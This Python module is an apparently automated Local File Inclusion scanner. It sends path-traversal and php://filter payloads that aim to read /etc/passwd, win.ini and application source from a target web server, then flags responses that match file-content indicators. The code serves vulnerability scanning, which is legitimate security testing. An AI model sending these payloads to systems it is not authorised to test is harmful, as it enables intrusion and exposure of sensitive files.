from __future__ import annotations

from urllib.parse import urlparse

import httpx

from bugfinder.agents.base import AgentResult, BaseAgent

LFI_PAYLOADS = [
    "../../../etc/passwd",
    "....//....//....//etc/passwd",
    "../../../../../../windows/win.ini",
    "/etc/passwd",
    "php://filter/convert.base64-encode/resource=index.php",
]


LFI_INDICATORS = [
    "root:x:",
    "root:x",
    "admin:x",
    "[fonts]",
    "[extensions]",
    "for 16-bit app support",
]


class LFIAgent(BaseAgent):
    name = "web.lfi"
    description = "Local File Inclusion scanner"

    async def execute(self) -> AgentResult:
        base_url = self.context.target
        if not base_url.startswith("http"):
            base_url = f"https://{base_url}"

        findings = []
        headers = {"User-Agent": "BugFinder/0.1.0"}

        async with httpx.AsyncClient(timeout=30, follow_redirects=False, verify=False) as client:
            try:
                resp = await client.get(base_url, headers=headers)
            except Exception:
                return AgentResult(
                    agent_name=self.name,
                    status="completed",
                    summary="Could not fetch target for LFI scanning",
                )

            import re

            params = re.findall(
                r'(?:file|page|doc|include|template|load|read|view|dir|show)\s*=\s*["\']?([^"\'&\s]+)',
                resp.text,
                re.IGNORECASE,
            )
            params = list(set(params))
            if not params:
                parsed = urlparse(base_url)
                if parsed.query:
                    params = [p.split("=")[0] for p in parsed.query.split("&") if "=" in p]
            if not params:
                params = ["file", "page", "include"]

            for param in params[:5]:
                for payload in LFI_PAYLOADS[:3]:
                    test_url = f"{base_url}?{param}={payload}" if "?" not in base_url else f"{base_url}&{param}={payload}"
                    try:
                        tr = await client.get(test_url, headers=headers)
                        body = tr.text.lower()
                        if any(ind in body for ind in LFI_INDICATORS):
                            findings.append(
                                {
                                    "title": "Potential Local File Inclusion",
                                    "description": f"Parameter '{param}' may be vulnerable to LFI via '{payload}'",
                                    "severity": "high",
                                    "confidence": "needs_review",
                                    "category": "lfi",
                                    "evidence": {
                                        "url": test_url,
                                        "parameter": param,
                                        "payload": payload,
                                        "indicator": next(i for i in LFI_INDICATORS if i in body),
                                    },
                                }
                            )
                    except Exception:
                        continue

        for f in findings:
            f["id"] = f"lfi-{findings.index(f)}"
        summary = f"Tested {len(params)} params for LFI, {len(findings)} potential issues"
        return AgentResult(
            agent_name=self.name,
            status="completed",
            findings=findings,
            summary=summary,
        )
